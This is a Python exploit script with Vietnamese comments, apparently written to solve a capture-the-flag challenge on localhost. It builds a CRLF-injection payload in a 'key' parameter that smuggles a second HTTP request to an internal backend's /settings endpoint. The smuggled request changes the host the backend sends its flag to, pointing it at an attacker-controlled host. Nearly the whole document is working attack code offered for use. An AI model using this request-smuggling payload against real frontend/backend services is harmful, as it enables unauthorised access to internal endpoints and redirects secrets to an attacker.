import requests
import urllib.parse
import sys

# --- CẤU HÌNH ---
# Địa chỉ IP của bài challenge (Frontend)
TARGET_IP = "localhost" 
TARGET_PORT = 81

# Host mà bạn muốn Backend gửi Flag về.
# LƯU Ý QUAN TRỌNG TỪ SOURCE CODE:
# 1. Độ dài tối đa: 6 ký tự.
# 2. Chỉ chấp nhận: chữ thường [a-z] và dấu chấm [.].
# 3. Không được chứa số hoặc dấu gạch ngang.
# Ví dụ: "web", "my.pc", "a.b". 
# Nếu chạy local docker compose, tên service thường là "web" hoặc "attacker".
ATTACKER_HOST = "web" 

def exploit():
    print(f"[*] Đang tấn công vào: http://{TARGET_IP}:{TARGET_PORT}")
    print(f"[*] Mục tiêu chuyển hướng Flag về: {ATTACKER_HOST}")

    # 1. Chuẩn bị Payload Smuggling
    # Phần đầu giả lập key sai để kết thúc request 1
    dummy_key = "fake_key"
    
    # Payload chính: Request thứ 2 được nhúng vào
    # Chúng ta gọi vào endpoint /settings để đổi host
    # Host header 'backend' là tên container backend trong mạng nội bộ (thường gặp)
    smuggled_request = (
        f"GET /settings?host={ATTACKER_HOST} HTTP/1.1\r\n"
        f"Host: backend\r\n"
        f"Content-Length: 0\r\n" # Đảm bảo request kết thúc sạch sẽ
        f"\r\n"
    )

    # Kết hợp lại:
    # \r\n\r\n ở giữa dùng để ngắt phần header của request 1 (do lỗ hổng trong app.py)
    full_payload = dummy_key + "\r\n\r\n" + smuggled_request

    # 2. Gửi Request
    # Khi gửi qua thư viện requests, nó sẽ tự động URL-encode payload.
    # Frontend (Flask) sẽ decode nó -> trở thành các ký tự \r\n (CRLF) thô
    # -> đi vào hàm socket.sendall() -> gây ra Smuggling.
    url = f"http://{TARGET_IP}:{TARGET_PORT}/trigger_reset"
    
    try:
        response = requests.get(url, params={"key": full_payload})
        
        # 3. Phân tích kết quả
        print(f"[*] Status Code Frontend trả về: {response.status_code}")
        
        # Nếu thành công, Backend sẽ xử lý cả 2 request.
        # Request 1 (Reset) -> 401 Unauthorized
        # Request 2 (Settings) -> 200 OK (Host updated...)
        # Frontend sẽ hứng toàn bộ dữ liệu trả về từ socket.
        
        if "Host updated" in response.text:
            print("\n[+] THÀNH CÔNG! Backend đã phản hồi 'Host updated'.")
            print(f"[+] Flag sẽ được gửi tới 'http://{ATTACKER_HOST}' mỗi 10 giây.")
            print("[+] Hãy kiểm tra log của server attacker ngay bây giờ.")
        else:
            print("\n[-] Có thể chưa thành công hoặc Frontend không hiển thị hết output.")
            print("Output trả về:")
            print(response.text)

    except requests.exceptions.RequestException as e:
        print(f"[!] Lỗi kết nối: {e}")

if __name__ == "__main__":
    exploit()